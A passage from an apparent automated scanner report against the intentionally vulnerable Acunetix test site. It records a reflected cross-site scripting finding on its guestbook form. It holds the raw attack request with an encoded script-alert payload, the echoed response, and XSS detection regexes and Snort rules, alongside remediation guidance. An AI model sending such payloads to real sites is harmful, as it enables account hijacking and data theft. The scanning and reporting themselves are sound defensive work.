<tr><td class="e">_SERVER["SERVER_SIGNATURE"]</td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">_SERVER["SERVER_SOFTWARE"]</td><td class="v">Apache/2.2.3 (FreeBSD) DAV/2 PHP/5.1.6 mod_ssl/2.2.3 OpenSSL/0.9.7e-p1</td></tr>

<tr><td class="e">_SERVER["SERVER_NAME"]</td><td class="v">acuart</td></tr>
<tr><td class="e">_SERVER["SERVER_ADDR"]</td><td class="v">192.168.0.5</td></tr>
<tr><td class="e">_SERVER["SERVER_PORT"]</td><td class="v">80</td></tr>
<tr><td class="e">_SERVER["REMOTE_ADDR"]</td><td class="v">192.168.0.26</td></tr>
<tr><td class="e">_SERVER["DOCUMENT_ROOT"]</td><td class="v">/var/www/acuart/</td></tr>
<tr><td class="e">_SERVER["SERVER_ADMIN"]</td><td class="v">root@localhost.localdomain</td></tr>

<tr><td class="e">_SERVER["SCRIPT_FILENAME"]</td><td class="v">/var/www/acuart/secured/phpinfo.php</td></tr>
<tr><td class="e">_SERVER["REMOTE_PORT"]</td><td class="v">11493</td></tr>
<tr><td class="e">_SERVER["GATEWAY_INTERFACE"]</td><td class="v">CGI/1.1</td></tr>
<tr><td class="e">_SERVER["SERVER_PROTOCOL"]</td><td class="v">HTTP/1.1</td></tr>
<tr><td class="e">_SERVER["REQUEST_METHOD"]</td><td class="v">GET</td></tr>
<tr><td class="e">_SERVER["QUERY_STRING"]</td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">_SERVER["REQUEST_URI"]</td><td class="v">/secured/phpinfo.php</td></tr>
<tr><td class="e">_SERVER["SCRIPT_NAME"]</td><td class="v">/secured/phpinfo.php</td></tr>
<tr><td class="e">_SERVER["PHP_SELF"]</td><td class="v">/secured/phpinfo.php</td></tr>
<tr><td class="e">_SERVER["REQUEST_TIME"]</td><td class="v">1201867164</td></tr>
<tr><td class="e">_SERVER["argv"]</td><td class="v"><pre>Array</pre></td></tr>
<tr><td class="e">_SERVER["argc"]</td><td class="v">0</td></tr>

<tr><td class="e">_ENV["LD_LIBRARY_PATH"]</td><td class="v">/usr/local/lib:</td></tr>
<tr><td class="e">_ENV["HOME"]</td><td class="v">/</td></tr>
<tr><td class="e">_ENV["PATH"]</td><td class="v">/sbin:/bin:/usr/sbin:/usr/bin</td></tr>
</table><br />
<h2>PHP License</h2>
<table border="0" cellpadding="3" width="600">
<tr class="v"><td>
<p>
This program is free software; you can redistribute it and/or modify it under the terms of the PHP License as published by the PHP Group and included in the distribution in the file:  LICENSE
</p>

<p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
</p>
<p>If you did not receive a copy of the PHP license, or have any questions about PHP licensing, please contact license@php.net.
</p>
</td></tr>
</table><br />
</div></body></html>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:57:11 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>close</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>45963</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="385A3137611FC63127563A086B8D2D6E"><URL>http://php.vulnweb.com:80/guestbook.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>name</AttackParamDescriptor><Issues><Issue id="ba8557a1-1023-46b8-883e-0b7472212096"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[POST /guestbook.php HTTP/1.1
Referer: http://php.vulnweb.com/guestbook.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="385A3137611FC63127563A086B8D2D6E";PSID="9E6C877AA131AD437C7CCB4E24D75A01";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="name";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="anonymous%2520user%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2531%2537%2533%2531%2538%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="6d065dfc";
X-Request-Memo: ID="6e4804f2";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

name=anonymous%20user%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%31%37%33%31%38%29%3c%2f%73%43%72%49%70%54%3e&text=12345&submit=add%20message]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2486" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="385A3137611FC63127563A086B8D2D6E"><![CDATA[POST /guestbook.php HTTP/1.1
Referer: http://php.vulnweb.com/guestbook.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="385A3137611FC63127563A086B8D2D6E";PSID="9E6C877AA131AD437C7CCB4E24D75A01";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="name";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="anonymous%2520user%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2531%2537%2533%2531%2538%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="6d065dfc";
X-Request-Memo: ID="6e4804f2";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

name=anonymous%20user%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%31%37%33%31%38%29%3c%2f%73%43%72%49%70%54%3e&text=12345&submit=add%20message]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:50:00 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5438

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>guestbook</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<div class="story">
	<table width="100%" cellpadding="4" cellspacing="1"><tr><td colspan="2"><h2>Our guestbook</h2></td></tr><tr><td align="left" valign="middle" style="background-color:#F5F5F5"><strong>anonymous user<sCrIpT>alert(17318)</sCrIpT></strong></td><td align="right" style="background-color:#F5F5F5">12.11.2020, 9:50 pm</td></tr><tr><td colspan="2"><img src="/images/remark.gif">&nbsp;&nbsp;12345</td></tr></table>	 </div>
	  <div class="story">
	  	<form action="" method="post" name="faddentry">
			<input type="hidden" name="name" value="anonymous user">
			<textarea name="text" rows="5" wrap="VIRTUAL" style="width:500px;"></textarea>
			<br>
			<input type="submit" name="submit" value="add message">
		</form>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="385A3137611FC63127563A086B8D2D6E"><Method>POST</Method><Path>/</Path><File>guestbook</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>name=anonymous%20user%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%31%37%33%31%38%29%3c%2f%73%43%72%49%70%54%3e&amp;text=12345&amp;submit=add%20message</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
